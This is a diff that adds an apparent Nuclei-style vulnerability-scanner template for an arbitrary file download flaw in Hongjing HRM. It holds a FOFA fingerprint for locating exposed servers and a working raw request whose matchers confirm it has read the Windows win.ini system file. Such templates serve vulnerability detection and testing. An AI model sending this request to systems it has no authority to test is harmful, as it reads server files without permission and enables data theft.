@@ -1,0 +1,28 @@
+id: Hrm_file_download
+info:
+  name: Hrm_file_download
+  author: H0m3ly
+  severity: critical
+  tags: 宏景hrm任意文件下载
+  description: FOFA语法：fid="pKe0FYeURzOIFmDkhJBwUg=="
+http:
+  - raw:
+      - |+
+        GET /servlet/OutputCode?path=Ix1E5Anj26gg4vfnak8pSKVU3Fi5TGhY HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[fonts]'
+          - '[extensions]'
+          - '[mci extensions]'
+          - '[files]'
+          - '[Mail]'
+        condition: or
+      - type: status
+        status:
+          - 200
